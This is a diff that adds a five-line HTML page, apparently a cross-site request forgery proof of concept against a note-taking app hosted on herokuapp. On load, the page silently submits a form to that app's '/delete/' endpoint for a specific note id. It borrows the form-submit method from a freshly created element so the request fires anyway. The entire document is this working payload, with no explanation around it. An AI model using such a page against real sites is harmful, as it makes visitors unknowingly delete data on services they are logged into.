@@ -1,0 +1,5 @@
+<html>
+<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
+<form id="myForm" method="GET" action="https://note-that.herokuapp.com/088de69e33244934987c1d990ec8b27a/delete/">
+</form>
+</html>
